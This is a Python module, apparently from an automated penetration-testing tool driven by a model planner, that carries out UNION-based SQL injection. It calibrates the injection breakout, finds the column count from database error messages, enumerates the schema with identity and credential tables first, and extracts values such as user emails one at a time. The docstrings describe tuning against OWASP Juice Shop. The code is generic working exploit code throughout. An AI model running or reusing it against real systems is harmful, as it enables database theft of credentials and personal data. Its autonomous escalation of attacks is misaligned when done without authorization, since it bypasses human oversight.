"""Deterministic UNION column discovery and data extraction.

Measured defect: the planner chose "UNION-based extraction" from its escalation menu but
had to guess the column count. It guessed 9 against Juice Shop's 10-column Product query,
the server answered `SQLITE_ERROR: SELECTs to the left and right of UNION do not have the
same number of result columns`, and the escalation died - the model was told the payload
failed but never which number would have worked. The column count is discoverable from
the error text itself, so the code finds it and hands the planner a fact.

Measured on Juice Shop in the same session, two further facts matter:

* `FROM Users` is required for a column that does not exist in the Product table
  (`SELECT email,...` without a FROM clause answered `no such column: email`).
* The application only tolerates unexpected data in the LAST result slot. Named columns
  in slots 1-2 made the response layer raise `Error: Unexpected path`, while the same
  value in slot 10 came back normally. Extraction therefore reads one value per request
  from the last slot, which is slower but actually returns data.

This module is transport-only: it reports what the server returned. Promoting a finding
stays with the oracles in `evidence/web_signatures.py`.
"""
import json
import re
import re
import urllib.parse

COLUMN_ERROR = re.compile(r'(?i)(same number of result columns|'
                          r'all (?:SELECT|select) statements must have (?:the same|an equal) number of columns|'
                          r'UNION (?:query|select)[^.]{0,40}(?:different|mismatch))')
SQL_ERROR = re.compile(r'(?i)(sqlite3?\.operationalerror|sqlite[ _]error|unrecognized token|'
                       r'syntax error|mysql|postgresql|ORA-\d{5}|syntaxerror)')
APP_ERROR = re.compile(r'(?i)(unexpected path|error:)')
def _unbalanced(text):
    """Whether a JSON-ish document stops mid-structure, i.e. it was cut rather than wrong.

    A complete error page balances its braces, so it is not a row list and must not be
    salvaged. Measuring balance is stricter than looking for an ellipsis: the adapter cuts
    at a byte offset, so the document simply ends with unclosed brackets.
    """
    depth, in_string, escaped = 0, False, False
    for char in text or '':
        if in_string:
            if escaped:
                escaped = False
            elif char == '\\':
                escaped = True
            elif char == '"':
                in_string = False
            continue
        if char == '"':
            in_string = True
        elif char in '{[':
            depth += 1
        elif char in '}]':
            depth -= 1
    return depth > 0 or in_string


MAX_COLUMNS = 25


def _quote(value):
    """Encode a payload the way a browser or a hand-written probe sends it.

    Measured: encoding `,` as `%2C` made the target answer 200 with zero rows for every
    column count, while the literal-comma form `UNION SELECT 1,2,3` returned rows. The
    separators are structural SQL, so they stay literal; only the characters that would
    break the query string are escaped.
    """
    return urllib.parse.quote(value, safe=",()/*-")


def _opener(prior_payload):
    """Close the original predicate the way the verified payload already did.

    The proven payload for this target was `x'))`, so a UNION appended to the same prefix
    keeps the original query syntactically valid up to the injection point.
    """
    # Keep everything before the first SQL keyword: the opener is the literal prefix the
    # verified payload used to break out of the original query. Capturing only the quote
    # characters dropped the leading token (measured: `a')) OR 1=1--` became `'))`, which
    # produced a 200 with zero rows and a wrong column count of 1).
    match = re.search(r'(?i)\s+(?:UNION|ORDER\s+BY|OR|AND)\s+', prior_payload or '')
    if match:
        prefix = (prior_payload or '')[:match.start()].strip()
        if prefix:
            return prefix
    return "x'))"


def _get(fetch, url):
    """Return (status, text) for one request through the caller's transport."""
    try:
        status, text = fetch(url)
    except Exception as exc:                      # transport failure is an observation
        return 0, '%s: %s' % (type(exc).__name__, exc)
    if isinstance(text, bytes):
        text = text.decode('utf-8', 'replace')
    return int(status), str(text or '')


def _row_list(text):
    """The list a JSON body exposes, or None when the body is not that shape.

    The excerpt the adapter hands back is capped at 2048 characters, so a successful
    extraction usually arrives as a *truncated* JSON document. Parsing it strictly
    returned None and every proven extraction read as zero rows; salvage the complete
    objects that ended before the cut instead.
    """
    try:
        body = json.loads(text)
    except Exception:
        # Only a *truncated* document earns salvage. A complete error page such as
        # {"error": "syntax"} is not a row list, and salvaging it invented one row for
        # every failed attempt - which made calibration accept the first syntax-error
        # stem it tried.
        return _salvage_rows(text) if _unbalanced(text) else None
    if isinstance(body, list):
        return [row for row in body if isinstance(row, dict)]
    if isinstance(body, dict):
        for key in ('data', 'items', 'results', 'records', 'rows'):
            value = body.get(key)
            if isinstance(value, list):
                return [row for row in value if isinstance(row, dict)]
    return None


def _salvage_rows(text):
    """Complete JSON objects embedded in a truncated document.

    The adapter caps the excerpt at 2048 characters, so a document that succeeded still
    arrives cut mid-object. The leaked rows live inside a `data` array, so they never
    balance back to depth 0 - salvage every object whose braces close, at any depth.
    """
    rows, stack = [], []
    for index, char in enumerate(text or ''):
        if char == '{':
            stack.append(index)
        elif char == '}' and stack:
            start = stack.pop()
            try:
                row = json.loads(text[start:index + 1])
            except Exception:
                continue
            if isinstance(row, dict):
                rows.append(row)
    return rows or None


def _rows(text):
    """Row count of a JSON body that exposes a list, or None when it is not that shape.

    Every caller compares this to zero or reports it as a count, so it must be an int:
    returning the list here made `rows > 0` raise TypeError mid-discovery.
    """
    rows = _row_list(text)
    return None if rows is None else len(rows)


def _calibrate_opener(fetch, target, parameter, seed_payload):
    """Find the closing syntax that actually terminates the injected predicate.

    Measured defect: the verified finding carries `a' OR 1=1--`, so the opener derived
    from it was `a'`. Against this target `a'` is a syntax error and every discovery
    attempt returned an error page, so a working extraction was reported as zero rows.
    Only `a'))` balances the `LIKE (` predicate. The target answers that question itself:
    a truthy frame returns rows, a falsy frame returns none. Grow the closing brackets
    until the pair behaves, and return the opener that balanced plus the evidence.
    """
    seed = str(seed_payload or '').split(' OR ')[0].split(' AND ')[0].strip()
    # The seed already carries its own quote; the stem is what precedes it.
    stem = seed[:-1].rstrip(')') if seed.endswith("'") else seed
    stem = stem or 'x'
    url_base = target.split('?')[0]
    tried = []
    for depth in range(0, 5):
        opener = stem + "'" + ')' * depth
        truthy = '%s?%s=%s' % (url_base, parameter, _quote(opener + ' OR 1=1--'))
        falsy = '%s?%s=%s' % (url_base, parameter, _quote(opener + ' AND 1=2--'))
        truthy_rows = _rows(_get(fetch, truthy)[1])
        falsy_rows = _rows(_get(fetch, falsy)[1])
        tried.append({'opener': opener, 'truthy_rows': truthy_rows, 'falsy_rows': falsy_rows})
        if truthy_rows and not falsy_rows:
            return opener, tried
    return _opener(seed_payload), tried


def discover_columns(fetch, target, parameter='q', prior_payload=None, baseline_status=200):
    """Find the UNION column count by asking the server, one column at a time.

    `fetch(url) -> (status, text)`. Returns a dict recording every attempt so the run's
    audit trail shows how the number was derived rather than asserting it.
    """
    opener, calibrated = _calibrate_opener(fetch, target, parameter, prior_payload)
    base = target.split('?')[0]
    attempts = []
    found = None
    for columns in range(1, MAX_COLUMNS + 1):
        payload = opener + ' UNION SELECT ' + ','.join(['1'] * columns) + '--'
        url = '%s?%s=%s' % (base, parameter, _quote(payload))
        status, text = _get(fetch, url)
        column_error = bool(COLUMN_ERROR.search(text))
        rows = _rows(text)
        attempts.append({'columns': columns, 'status': status,
                         'column_error': column_error,
                         'rows': rows,
                         'payload': payload})
        # A count is right when the column-count error is gone AND the response is a
        # successful row-bearing answer, not merely a 200 error page.
        if not column_error and status == baseline_status and rows:
            found = columns
            break
        if not column_error and rows is not None and rows > 0:
            found = columns
            break
    return {'target': base, 'parameter': parameter, 'opener': opener,
            'opener_calibration': calibrated,
            'columns': found, 'attempts': attempts,
            'method': 'column_count_error_elimination'}


def extraction_payload(discovery, fields, table=None):
    """A UNION payload that pulls one value into the slot the response layer tolerates.

    Measured: named columns in slots 1-2 produced `Error: Unexpected path`; the same value
    in the last slot came back as an ordinary field value. The extraction therefore fills
    every slot with a literal and puts the single requested expression last.
    """
    columns = discovery.get('columns')
    if not columns:
        return None
    expression = str(fields) if isinstance(fields, str) else ','.join(str(f) for f in fields)
    fillers = [str(i) for i in range(1, columns)]
    source = (' FROM ' + table) if table else ''
    # The response adapter keeps only the first 2048 characters, and the injected SELECT
    # appends its rows after the original query's rows. Measured: row 0 carried
    # `deletedAt: null` and the first email appeared past the excerpt window, so a
    # successful extraction read as zero values. Filter out the null rows and sort
    # descending in SQL so the leaked values start the excerpt instead of ending it.
    tail = ''
    if table:
        tail = ' WHERE {0} IS NOT NULL ORDER BY {0} DESC'.format(expression)
    return (discovery['opener'] + ' UNION SELECT '
            + ','.join(fillers + [expression]) + source + tail + '--')


def _slot_values(text, filler_values=()):
    """Every value the response layer exposed in the last slot.

    Measured: the injected expression lands in the final JSON key of each row while the
    preceding slots land in the fields before it. The first row is often the `deletedAt:
    null` placeholder, so reading only the first row returns nothing - collect every
    distinct value that is not one of the numeric fillers we sent.
    """
    rows = _row_list(text)
    if not rows:
        return 0, []
    fillers = {str(v) for v in filler_values} | {'None', 'null'}
    seen, values = set(), []
    last_key = None
    for row in rows:
        if not isinstance(row, dict) or not row:
            continue
        last_key = last_key or list(row)[-1]
        value = row.get(last_key)
        text_value = '' if value is None else str(value)
        if text_value and text_value not in fillers and text_value not in seen:
            seen.add(text_value)
            values.append(value)
    return len(rows), values


def enumerate_schema(fetch, target, parameter, discovery, prior_payload=None):
    """Ask the target what its tables and columns are, instead of assuming them.

    Measured defect this replaces: the extraction carried a literal
    ``('email', 'Users', 'user_email')`` list. Column counting was measured, but the names
    were the ones one deployment happens to use, so every other target reported "no
    impact" for the wrong reason.

    The listing is asked in two cheap steps - table names, then the columns of one table
    per request - because a single joined catalogue string runs past the response excerpt
    cap and parses to nothing while the injection has plainly worked.

    Each engine's catalogue query is tried until one answers with a parseable listing.
    Returns ``{'dialect', 'tables', 'attempts'}``; an empty ``tables`` means the schema
    could not be read and the caller must say so rather than guess.
    """
    from src.adaptix.evidence.schema_discovery import (CATALOGUE_QUERIES, MAX_TABLES,
                                                       catalogue_expression, parse_catalogue)
    base = target.split('?')[0]
    fillers = [str(i) for i in range(1, (discovery.get('columns') or 1))]
    attempts = []

    def ask(query):
        payload = catalogue_expression(discovery, query)
        url = '%s?%s=%s' % (base, parameter, _quote(payload))
        status, text = _get(fetch, url)
        _count, values = _slot_values(text, fillers)
        value = next((v for v in values if v and str(v).strip()), None)
        return status, (str(value).strip() if value else ''), text

    for entry in CATALOGUE_QUERIES:
        status, listing, text = ask(entry['tables_query'])
        names = [name.strip() for name in listing.split(entry['separator']) if name.strip()]
        # A catalogue answer is a list of identifiers; anything else means this dialect
        # did not answer and the next one should be tried.
        if not names or any(' ' in name for name in names) or len(names) > 200:
            attempts.append({'dialect': entry['dialect'], 'step': 'tables', 'status': status,
                             'found': False, 'excerpt': (listing or text)[:160]})
            continue

        tables = {}
        # Identity tables first: they carry the impact, and the request bound is finite.
        ordered = sorted(names, key=lambda name: (
            0 if re.search(r'(?i)(user|account|member|customer|person|staff|admin|login)', name) else 1,
            name.lower()))[:MAX_TABLES]
        for table in ordered:
            query = entry['columns_query'].format(table=table.replace("'", "''"))
            column_status, columns_text, column_raw = ask(query)
            columns = [c.strip() for c in columns_text.split(entry['separator']) if c.strip()]
            tables[table] = columns
            attempts.append({'dialect': entry['dialect'], 'step': 'columns', 'table': table,
                             'status': column_status, 'columns': len(columns),
                             'excerpt': (columns_text or column_raw)[:120]})
        read = {name: cols for name, cols in tables.items() if cols}
        return {'dialect': entry['dialect'], 'tables': read or tables,
                'attempts': attempts}
    return {'dialect': None, 'tables': {}, 'attempts': attempts}


def extraction_targets(schema):
    """What to extract, derived from the discovered schema.

    Falls back to a version string only: naming any table here would reintroduce the
    guess this replaces.
    """
    from src.adaptix.evidence.schema_discovery import rank_credential_columns
    chosen = rank_credential_columns(schema.get('tables') or {})
    if chosen:
        return chosen
    return [(name, None, label) for name, label in
            (('sqlite_version()', 'database_version'), ('version()', 'database_version'))]


def probe_and_confirm(fetch, target, parameter='q', prior_payload=None, expression=None,
                      table=None, baseline_text='', discovery=None):
    """Discover the column count, then extract one expression and report what came back.

    `discovery` lets a caller that already measured the column count pass it in instead of
    paying for the same 10-request search again.
    """
    discovery = discovery or discover_columns(fetch, target, parameter, prior_payload)
    result = {'discovery': discovery, 'extraction': None}
    if discovery['columns'] and expression:
        payload = extraction_payload(discovery, expression, table)
        base = target.split('?')[0]
        url = '%s?%s=%s' % (base, parameter, _quote(payload))
        status, text = _get(fetch, url)
        fillers = [str(i) for i in range(1, discovery['columns'])]
        count, values = _slot_values(text, fillers)
        # A value the baseline already returns proves nothing: it would be the original
        # product data rather than the injected SELECT.
        fresh = [v for v in values if str(v) not in baseline_text]
        result['extraction'] = {
            'url': url,
            'payload': payload,
            'expression': expression,
            'status': status,
            'rows': count,
            'values': fresh[:20],
            'value_count': len(fresh),
            'app_error': bool(APP_ERROR.search(text)) and not fresh,
            'column_error': bool(COLUMN_ERROR.search(text)),
            'sql_error': bool(SQL_ERROR.search(text)),
            'excerpt': text[:400],
            # Extraction succeeded when the injected SELECT executed and values came back
            # that the baseline response does not contain.
            'executed': bool(status == 200 and fresh
                             and not COLUMN_ERROR.search(text) and not SQL_ERROR.search(text)),
        }
    return result
